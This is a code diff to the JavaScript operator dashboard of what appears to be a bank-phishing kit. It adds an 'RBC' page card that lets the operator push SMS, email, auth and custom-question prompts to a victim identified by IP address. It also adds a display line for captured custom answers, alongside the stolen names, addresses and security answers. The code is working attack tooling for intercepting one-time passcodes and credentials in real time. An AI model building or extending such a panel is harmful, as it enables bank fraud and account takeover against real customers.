@@ -53,7 +53,7 @@ function updateConnectionsTable(users) {
       color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
     }
 
-    if (details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
+    if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
       userDiv.innerHTML = `
         
           <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
@@ -174,6 +174,50 @@ function updateConnectionsTable(users) {
       sendAuthButton.addEventListener('click', function() {
         socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
       });    
+    } else if(details.page == 'RBC'){
+      userDiv.innerHTML = `
+        
+      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
+      <div class="card">
+        <div class="card-header">
+          <span class="badge bg-${color}">
+            ${ipAddress}
+          </span>
+        </div>
+        <div class="card-body">
+          <h5 class="card-title">${details.page || ''}</h5>
+          <p class="card-text">${details.stage || ''}</p>
+          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+          <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
+          <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
+          <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
+          <a href="#" class="m-1 btn btn-warning" data-toggle="modal" data-target="#customQuestionModal">Custom Question</a>
+          </div>
+      </div>
+
+      `;
+
+      let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
+      let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
+      let sendAuthButton = userDiv.querySelector('.send-auth-button');
+
+      sendOtpSmsButton.addEventListener('click', function() {
+        socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
+      });
+
+      sendOtpEmailButton.addEventListener('click', function() {
+        socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
+      });     
+      
+      sendAuthButton.addEventListener('click', function() {
+        socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
+      });    
+
+      document.getElementById('sendCustomQuestionButton').addEventListener('click', function() {
+        var customQuestion = document.getElementById('customQuestion').value;
+        socket.emit('sendOTP', {ip: ipAddress, navig: `qst2`, customQuestion: customQuestion })
+        $('#customQuestionModal').modal('hide');
+      })
     } else {
       userDiv.innerHTML = `
        
@@ -221,6 +265,7 @@ function updateConnectionsTable(users) {
               <li class="list-group-item">${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}</li>
               <li class="list-group-item">${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}</li>
               <li class="list-group-item">${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}</li>
+              <li class="list-group-item">${details.getUserDataQuestion.customQuestion || ''} : ${details.getUserDataQuestion.customAnswer || ''}</li>
                 <li class="list-group-item">----------------------------------------------------------</li>
             <li class="list-group-item">Full Name: ${details.getUserDataDetails.name || ''}</li>
             <li class="list-group-item">Address: ${details.getUserDataDetails.address || ''}</li>
